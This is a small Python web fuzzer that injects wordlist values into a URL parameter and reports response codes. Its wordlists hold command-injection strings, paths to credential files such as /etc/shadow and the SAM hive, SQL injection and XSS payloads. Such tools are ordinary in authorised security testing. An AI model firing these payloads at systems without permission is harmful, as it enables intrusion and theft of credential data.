#!/usr/bin/env python3
"""
Fuzzing Tool with Payloads
Usage: python fuzz.py https://target.com/api?param=FUZZ
"""

import sys
import requests
import concurrent.futures

class Fuzzer:
    def __init__(self, url):
        self.url = url
        self.found = []
        
        # Fuzz wordlists
        self.wordlists = {
            'numbers': [str(i) for i in range(100)],
            'chars': [chr(i) for i in range(ord('a'), ord('z')+1)],
            'special': ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '{', '}', '[', ']'],
            'commands': ['whoami', 'id', 'uname', 'ls', 'dir', 'cat /etc/passwd', 'net user'],
            'paths': ['/etc/passwd', '/etc/shadow', 'C:\\Windows\\System32\\config\\SAM'],
            'sql': ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"],
            'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
        }
    
    def test_fuzz(self, value):
        """Test a fuzz value"""
        url = self.url.replace('FUZZ', str(value))
        try:
            r = requests.get(url, timeout=5)
            return {'value': value, 'status': r.status_code, 'length': len(r.text)}
        except:
            return None
    
    def fuzz(self, wordlist='numbers', threads=10):
        """Fuzz the URL"""
        print(f"[*] Fuzzing with {wordlist}...")
        
        values = self.wordlists.get(wordlist, [])
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.test_fuzz, v): v for v in values}
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result and result['length'] > 0:
                    print(f"[+] {result['value']}: {result['status']}")
                    self.found.append(result)
        
        return self.found


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='URL with FUZZ')
    parser.add_argument('-w', '--wordlist', default='numbers', help='Wordlist to use')
    args = parser.parse_args()
    
    fuzzer = Fuzzer(args.url)
    fuzzer.fuzz(args.wordlist)


if __name__ == "__main__":
    main()